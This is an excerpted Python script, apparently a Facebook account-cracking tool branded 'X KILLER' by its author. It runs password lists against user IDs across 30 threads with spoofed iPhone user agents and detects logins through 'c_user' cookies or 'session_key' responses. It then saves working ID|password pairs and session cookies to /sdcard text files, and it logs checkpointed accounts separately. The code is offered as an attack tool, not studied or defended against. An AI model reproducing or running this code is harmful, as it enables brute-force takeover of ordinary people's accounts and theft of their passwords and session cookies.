...
\033[1;32m##     ##  ######  ##     ## X KILLER
----------------------------------------------
AUTHER    : Tajul Islam Rabbi  
BROTHER ❤️: Tajul Islam 💜
Facebook : Tajul Islam Rabbi😈😈
Tool Name: Tajul Islam
...
def auto_file(cookies,access_token):
        ...
        print('\n \033[1;97m /sdcard/Tajul😈 \033[0;97m\n')
        #100010138361148
                ...
                if "server on" in sj:
                        ...
                        if xd in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        linex()
                                        print("\033[1;32m OK IDZ SAVED IN >>>>> /SDCARD/Tajul-OK.TXT")
                                        print("\033[1;32m CP IDZ SAVED IN >>>>> /SDCARD/Tajul-CP.TXT")
                                        print("\033[1;32m COOKIE SAVED IN >>>> /SDCARD/Tajul-COOKIE.TXT")
                                        linex()
...
def za():
    ...
    if myid in str(body):
        ...
        print(" run again python Tajul.py")
...
def pak():
                ...
                with tred(max_workers=30) as Tajul:     
                        clear()
                        tl = str(len(user))
                        ...
                        linex()
                        print("\033[1;32m OK IDZ SAVED IN >>>>> /SDCARD/-OK.TXT")
                        print("\033[1;32m CP IDZ SAVED IN >>>>> /SDCARD/Tajul-CP.TXT")
                        print("\033[1;32m COOKIE SAVED IN >>>> /SDCARD/Tajul-COOKIE.TXT")
                        linex()
                        for psx in user:
                                ...
                                Tajul.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [Tajul] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    "user-agent": ua,
                        ...
                        Tajul=str(session.cookies)
                        if "c_user" in Tajul:
                                print('\r\r\033[1;32m [Tajul-OK] %s | %s'%(ids,pas))
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                print("Cookie: "+coki)
                                open('/sdcard/Tajul-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/Tajul-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Tajul:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [Tajul-CP] '+ids+' | '+pas+'\033[1;97m')
                ...
                try:
                        ...
                        for pw in passlist:
                            ...
                            "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',}
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [Tajul-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Tajul-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [Tajul-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/Tajul-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/Tajul-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [Tajul-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Tajul-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
